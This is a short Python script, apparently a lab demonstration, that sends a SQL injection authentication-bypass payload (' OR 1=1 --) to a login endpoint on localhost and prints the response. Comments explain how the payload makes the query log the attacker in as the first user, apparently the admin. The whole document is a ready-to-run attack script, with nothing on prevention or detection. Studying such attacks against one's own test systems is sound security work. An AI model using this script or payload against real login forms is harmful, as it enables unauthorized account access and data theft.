import requests

URL = "http://127.0.0.1:5000/login"

def simulate_sqli():
    # Payload explanation:
    # ' OR 1=1 --
    # This makes the WHERE clause: WHERE username = '' OR 1=1 --' AND password = '...'
    # Since 1=1 is always true and '--' comments out the rest, you log in as the first user (admin).
    
    payload = {
        "username": "' OR 1=1 --",
        "password": "any_password"
    }

    print(f"[*] Attempting SQL Injection on {URL}....")
    response = requests.post(URL, data=payload)

    if response.status_code == 200:
        print("[+] Success! Server response:")
        print(response.text)
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    simulate_sqli()
